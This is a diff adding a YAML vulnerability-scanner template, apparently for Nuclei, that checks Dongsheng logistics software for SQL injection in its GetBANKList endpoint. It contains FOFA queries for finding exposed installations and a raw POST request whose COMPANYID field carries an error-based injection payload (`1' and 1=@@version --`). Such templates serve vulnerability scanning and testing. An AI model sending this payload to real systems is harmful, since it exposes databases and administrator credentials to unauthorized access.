@@ -1,0 +1,30 @@
+id: dongsheng-logistics-getbanklist-sql
+
+info:
+  name: "东胜物流软件 GetBANKList 模块存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+          东胜物流软件由青岛东胜伟业软件有限公司开发，是一款集成订单管理、仓储管理及运输管理功能的物流管理系统。验证后的远程攻击者可利用该漏洞执行恶意构造的SQL语句，导致数据库敏感信息泄露（如管理员后台凭证及用户个人信息）。在具备高权限访问条件下，攻击者可能进一步在目标服务器部署恶意程序，从而获取系统控制权限。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    POST /MvcShipping/MsBaseInfo/GetBANKList HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Connection: close
+
+    condition=1&isvisible=true&issavevalue=true&COMPANYID=1%27%20and%201=@@version%20--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'Microsoft'
